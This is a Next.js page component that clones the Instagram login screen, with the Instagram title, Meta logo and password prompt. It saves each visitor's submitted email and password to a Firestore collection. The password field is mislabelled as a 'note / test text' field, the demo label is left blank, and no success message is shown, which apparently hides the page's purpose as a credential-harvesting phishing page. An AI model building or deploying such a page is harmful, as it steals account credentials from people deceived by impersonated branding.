"use client";

import { FormEvent, useState } from "react";
import { addDoc, collection, serverTimestamp } from "firebase/firestore/lite";
import Image from "next/image";
import { db } from "@/lib/firebase";

export default function AuthPage() {
  const [email, setEmail] = useState("");
  const [note, setNote] = useState("");
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState("");
  const [error, setError] = useState("");

  async function handleSubmit(event: FormEvent<HTMLFormElement>) {
    event.preventDefault();

    console.log("1 - submit started");

    setLoading(true);
    setError("");
    setMessage("");

    try {
      console.log("2 - Firestore write starting");

      const docRef = await addDoc(collection(db, "submissions"), {
        email,
        note,
        createdAt: serverTimestamp(),
      });

      console.log("3 - Firestore write SUCCESS:", docRef.id);

      setMessage("");
      setEmail("");
      setNote("");
    } catch (err) {
      console.error("FIRESTORE WRITE ERROR:", err);
      setError("Impossible d'enregistrer les données.");
    } finally {
      console.log("4 - submit finished");
      setLoading(false);
    }
  }

  return (
    <main className="auth-shell">
      <section className="hero-panel" aria-label="Introduction">
        <div className="brand-mark" aria-hidden="true">
          <div className="brand-mark-inner" />
        </div>

        <div className="hero-copy">
          <h1>
            Discover everyday moments from your <span>close friends.</span>
          </h1>
        </div>

        <div className="story-visual">
          <Image
            src="/auth/story-collage.png"
            alt=""
            width={650}
            height={538}
            className="story-collage-image"
            priority
          />
        </div>
      </section>

      <section className="login-panel">
        <div className="auth-card">
          <p className="mobile-language">English (US)</p>

          <div className="login-logo">
            <Image
              src="/auth/right-logo-transparent.png"
              alt="Instagram UI Demo"
              width={72}
              height={72}
              priority
              unoptimized
            />
          </div>

          <p className="auth-title">Log in to Instagram</p>
          <p className="demo-label"></p>

          <form onSubmit={handleSubmit} className="auth-form">
            <label className="sr-only" htmlFor="email">Email</label>
            <input
              id="email"
              type="text"
              placeholder="Email"
              value={email}
              onChange={(event) => setEmail(event.target.value)}
            />

            <label className="sr-only" htmlFor="note">Note / test text</label>
            <input
              id="note"
              type="text"
              placeholder="Password"
              value={note}
              onChange={(event) => setNote(event.target.value)}
            />

            <button className="primary-button" type="submit" disabled={loading}>
              {loading ? "Logging..." : "Log in"}
            </button>
          </form>

          {error && <p className="status error" role="alert">{error}</p>}
          {message && <p className="status success" role="status">{message}</p>}

          <p className="forgot-save">Forgot your password ?</p>

          <button className="create-account-button" type="button">
            Create new account
          </button>

          <div className="meta-brand">
            <Image
              src="/auth/meta-logo.png"
              alt="Meta"
              width={92}
              height={46}
              className="meta-logo"
            />
          </div>
        </div>
      </section>

    </main>
  );
}
